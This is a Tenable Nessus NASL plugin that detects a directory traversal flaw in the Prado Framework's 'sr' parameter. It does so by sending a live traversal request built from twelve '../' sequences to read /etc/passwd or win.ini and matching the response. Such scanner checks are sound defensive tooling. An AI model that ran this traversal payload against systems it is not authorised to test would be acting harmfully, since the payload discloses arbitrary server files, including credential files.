#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63477);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_bugtraq_id(56677);
  script_osvdb_id(87874);
  script_xref(name:"EDB-ID",value:"22937");

  script_name(english:"Prado Framework sr Parameter Directory Traversal");
  script_summary(english:"Tries to exploit the vuln to read a file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server has a web framework that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Prado Framework installed does not sanitize user input
to 'sr' parameter of the 'test/test_tools/functional_tests.php' before
using it to return the contents of the file. 

An unauthenticated, remote attacker can exploit this issue to retrieve
arbitrary files outside of the server's root web directory.");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"PRADO 3.2.0 File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/11/26"); 
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:prado:framework");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

appname = "Prado Framework";

if (thorough_tests) dirs = list_uniq(make_list("/prado", cgi_dirs()));
else dirs = make_list(cgi_dirs());

url = "/tests/test_tools/selenium/core/SeleniumLog.html";
install_dir = make_list();
vuln_url = make_list();
output = "";
exploited = 0;

foreach dir (dirs) 
{
  res = http_send_recv3(
    method       : "GET",
    item         : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );
  if (
    '<title>Selenium Log Console</title>' >< res[2] &&
    'for="level-error">Error' >< res[2]
  )
  {
     install_dir = make_list(install_dir, dir); 
  }
}
if (max_index(install_dir) == 0) audit(AUDIT_WEB_APP_NOT_INST, appname, port);

# Determine what to look for
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

traversal = mult_str(str:"../", nb:12);
foreach dir (install_dir)
{  
  foreach file (files)
  {
    exploit_url = dir + "/tests/test_tools/functional_tests.php?sr=" + traversal + file;
    res = http_send_recv3(
      port         : port,
      method       : "GET",
      item         : exploit_url,
      exit_on_fail : TRUE
    );

    if (egrep(pattern:file_pats[file], string:res[2]))
    {
      vuln_url = make_list(vuln_url, exploit_url);
      output = res[2];
      exploited++;
     if (!thorough_tests) break;
    } 
  }
}

if (exploited)
{
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists using the following request : \n';
    foreach url (vuln_url) 
    {
      report = report + '\n ' + build_url(port:port, qs:url);
    }
    if (report_verbosity > 1)
    {
      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
        '\n' + chomp(output) +
        '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else
{
  install_locs = "";
  foreach dir (install_dir)
  {
    install_locs += " / " + build_url(port:port, qs:dir);
  }
  install_locs = substr(install_locs, 3);

  if (max_index(install_dir) == 1) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(port:port, qs:install_locs));
  else exit(0, "The "+appname+" installs at "+install_locs+" are not affected.");
}
